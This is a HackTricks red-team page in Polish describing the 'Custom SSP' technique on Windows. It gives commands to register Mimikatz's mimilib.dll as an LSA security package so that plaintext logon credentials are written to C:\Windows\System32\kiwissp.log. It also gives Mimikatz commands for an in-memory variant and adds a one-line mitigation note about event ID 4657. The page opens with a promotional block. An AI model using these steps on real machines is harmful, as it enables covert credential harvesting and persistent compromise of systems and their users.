# Niestandardowy SSP

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### Niestandardowy SSP

[Dowiedz się, czym jest SSP (Dostawca Wsparcia Bezpieczeństwa) tutaj.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Możesz stworzyć **własny SSP**, aby **przechwycić** w **czystym tekście** dane **uwierzytelniające** używane do dostępu do maszyny.

#### Mimilib

Możesz użyć binarnej `mimilib.dll` dostarczonej przez Mimikatz. **Spowoduje to zapisanie w pliku wszystkich danych uwierzytelniających w czystym tekście.**\
Upuść plik dll w `C:\Windows\System32\`\
Pobierz listę istniejących pakietów zabezpieczeń LSA:

{% code title="atakujący@cel" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Dodaj `mimilib.dll` do listy dostawców obsługi zabezpieczeń (pakiety zabezpieczeń):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
I po ponownym uruchomieniu wszystkie poświadczenia można znaleźć w formie tekstu jawnego w `C:\Windows\System32\kiwissp.log`

#### W pamięci

Możesz także wstrzyknąć to bezpośrednio w pamięć za pomocą Mimikatz (zauważ, że może to być trochę niestabilne/nie działać):
```powershell
privilege::debug
misc::memssp
```
To nie przetrwa ponownego uruchomienia.

#### Mitygacja

Identyfikator zdarzenia 4657 - Audyt tworzenia/zmiany `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
